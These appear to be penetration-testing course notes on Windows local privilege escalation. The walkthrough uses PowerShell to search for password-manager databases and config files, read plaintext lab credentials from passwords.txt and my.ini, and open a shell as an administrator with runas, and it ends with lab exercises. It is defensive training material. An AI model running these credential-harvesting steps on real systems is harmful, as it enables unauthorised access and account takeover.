# Hidden in Plain View

Searching for password manager databases on the C:\ drive
>``` shell
>PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
>
># ========== Expected Result ==========
>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
># =====================================
>```

Searching for sensitive information in XAMPP directory
>``` shell
>PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
>
># ========== Expected Result ==========
>Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
>...
>Directory: C:\xampp\mysql\bin
>
>Mode                 LastWriteTime         Length Name                                               
>----                 -------------         ------ ----                                               
>-a----         6/16/2022   1:42 PM           5786 my.ini
>...
>Directory: C:\xampp
>
>Mode                 LastWriteTime         Length Name                                              
>----                 -------------         ------ ----                                                                 
>-a----         3/13/2017   4:04 AM            824 passwords.txt
>-a----         6/16/2022  10:22 AM            792 properties.ini     
>-a----         5/16/2022  12:21 AM           7498 readme_de.txt 
>-a----         5/16/2022  12:21 AM           7368 readme_en.txt     
>-a----         6/16/2022   1:17 PM           1200 xampp-control.ini 
># =====================================
>```

Review the contents of passwords.txt and my.ini
>``` shell
>PS C:\Users\dave> type C:\xampp\passwords.txt
>
># ========== Expected Result ==========
>type C:\xampp\passwords.txt
>### XAMPP Default Passwords ###
>
>1) MySQL (phpMyAdmin):
>
>   User: root
>   Password:
>   (means no password!)
>...
>   Postmaster: Postmaster (postmaster@localhost)
>   Administrator: Admin (admin@localhost)
>
>   User: newuser  
>   Password: wampp 
>...
># =====================================
>
>PS C:\Users\dave> type C:\xampp\mysql\bin\my.ini
>
># ========== Expected Result ==========
>type C:\xampp\mysql\bin\my.ini
>type : Access to the path 'C:\xampp\mysql\bin\my.ini' is denied.
>At line:1 char:1
>+ type C:\xampp\mysql\bin\my.ini
>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : PermissionDenied: (C:\xampp\mysql\bin\my.ini:String) [Get-Content], UnauthorizedAccessEx 
>   ception
>    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
># =====================================
>```

Searching for text files and password manager databases in the home directory of dave
>``` shell
>PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
>
># ========== Expected Result ==========
>Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
>
>    Directory: C:\Users\dave\Desktop
>
>
>Mode                 LastWriteTime         Length Name                                                                 
>----                 -------------         ------ ----                                                                 
>-a----         6/16/2022  11:28 AM            339 asdf.txt 
># =====================================
>```

Contents of asdf.txt
>``` shell
>PS C:\Users\dave> cat Desktop\asdf.txt
>
># ========== Expected Result ==========
>cat Desktop\asdf.txt
>notes from meeting:
>
>- Contractors won't deliver the web app on time
>- Login will be done via local user credentials
>- I need to install XAMPP and a password manager on my machine 
>- When beta app is deployed on my local pc: 
>Steve (the guy with long shirt) gives us his password for testing
>password is: securityIsNotAnOption++++++
># =====================================
>```

Local groups user steve is a member of
>``` shell
>PS C:\Users\dave> net user steve
>
># ========== Expected Result ==========
>net user steve
>User name                    steve
>...
>Last logon                   6/16/2022 1:03:52 PM
>
>Logon hours allowed          All
>
>Local Group Memberships      *helpdesk             *Remote Desktop Users 
>                             *Remote Management Use*Users                
>...
># =====================================
>```

RDP Connection as _steve_
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Hidden-in-Plain-View-1.png)

Contents of the my.ini file
>``` shell
>PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
>
># ========== Expected Result ==========
># Example MySQL config file for small systems.
>...
>
># The following options will be passed to all MySQL clients
># backupadmin Windows password for backup job
>[client]
>password       = admin123admin123!
>port=3306
>socket="C:/xampp/mysql/mysql.sock"
># =====================================
>```

Local groups backupadmin is a member of
>``` shell
>PS C:\Users\steve> net user backupadmin
>
># ========== Expected Result ==========
>User name                    BackupAdmin
>...
>
>Local Group Memberships      *Administrators       *BackupUsers
>                             *Users
>Global Group memberships     *None
>The command completed successfully.
># =====================================
>```

Using Runas to execute cmd as user backupadmin
>``` shell
>PS C:\Users\steve> runas /user:backupadmin cmd
>
># ========== Expected Result ==========
>Enter the password for backupadmin:
>Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
># =====================================
>```

Cmd running in the context of backupadmin
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Hidden-in-Plain-View-2.png)

Lab 1 - Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
>``` shell
>
>```
>

Lab 2 - Log into the system CLIENTWK220 (VM #1) via RDP as user steve. Search the file system to find login credentials for a web page for the user steve and enter the password as answer to this exercise.
>``` shell
>
>```
>

Lab 3 - Connect to CLIENTWK221 (VM #2) via RDP as user mac with the password IAmTheGOATSysAdmin! and locate sensitive information on the system to elevate your privileges. Once found, use the credentials to access the system as this user and find the flag on the Desktop.
>``` shell
>
>```
>
